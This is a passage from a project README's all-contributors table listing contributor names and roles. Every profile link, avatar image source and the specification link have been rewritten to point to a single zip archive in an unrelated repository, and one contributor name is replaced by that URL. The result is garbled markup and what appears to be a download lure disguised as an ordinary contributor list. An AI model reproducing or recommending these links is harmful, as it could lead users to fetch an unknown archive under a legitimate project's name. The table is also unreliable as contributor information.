      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Manav Desai"/><br /><sub><b>Manav Desai</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Documentation">📖</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Mohd Toukir Khan"/><br /><sub><b>Mohd Toukir Khan</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Documentation">📖</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Anisat Akinbani"/><br /><sub><b>Anisat Akinbani</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Documentation">📖</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="sambhavgupta0705"/><br /><sub><b>sambhavgupta0705</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
    </tr>
    <tr>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Ankit Chaudhary"/><br /><sub><b>Ankit Chaudhary</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="samz"/><br /><sub><b>samz</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Bhaswati Roy "/><br /><sub><b>Bhaswati Roy </b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Documentation">📖</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="AISHAT MUIBUDEEN"/><br /><sub><b>AISHAT MUIBUDEEN</b></sub></a><br /><a href="#design-Mayaleeeee" title="Design">🎨</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Nawed Ali"/><br /><sub><b>Nawed Ali</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Olaleye Blessing"/><br /><sub><b>Olaleye Blessing</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a> <a href="#a11y-Olaleye-Blessing" title="Accessibility">️️️️♿️</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="niranjan-kurhade"/><br /><sub><b>niranjan-kurhade</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
    </tr>
    <tr>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Benjamin Rukundo"/><br /><sub><b>Benjamin Rukundo</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="tthijm"/><br /><sub><b>tthijm</b></sub></a><br /><a href="#infra-tthijm" title="Infrastructure (Hosting, Build-Tools, etc)">🚇</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Cynthia Peter"/><br /><sub><b>Cynthia Peter</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Documentation">📖</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Florence Njeri"/><br /><sub><b>Florence Njeri</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Ansh Goyal"/><br /><sub><b>Ansh Goyal</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a> <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%3Apr+reviewed-by%3Aanshgoyalevil" title="Reviewed Pull Requests">👀</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"/><br /><sub><b>https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip</b></sub></a><br /><a href="#infra-SumantxD" title="Infrastructure (Hosting, Build-Tools, etc)">🚇</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Shriansh Agarwal"/><br /><sub><b>Shriansh Agarwal</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
    </tr>
    <tr>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Aadrika Bhargava"/><br /><sub><b>Aadrika Bhargava</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Vishvamsinh Vaghela"/><br /><sub><b>Vishvamsinh Vaghela</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Animesh Kumar"/><br /><sub><b>Animesh Kumar</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Documentation">📖</a> <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%3Apr+reviewed-by%3AAnimeshKumar923" title="Reviewed Pull Requests">👀</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Akshay Sharma"/><br /><sub><b>Akshay Sharma</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Yuvraj Singh Sisodiya"/><br /><sub><b>Yuvraj Singh Sisodiya</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Neutron"/><br /><sub><b>Neutron</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Sagar Kori"/><br /><sub><b>Sagar Kori</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Documentation">📖</a></td>
    </tr>
    <tr>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Raj Patel"/><br /><sub><b>Raj Patel</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
    </tr>
  </tbody>
</table>

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->

This project follows the [all-contributors](https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip) specification. Contributions of any kind welcome!
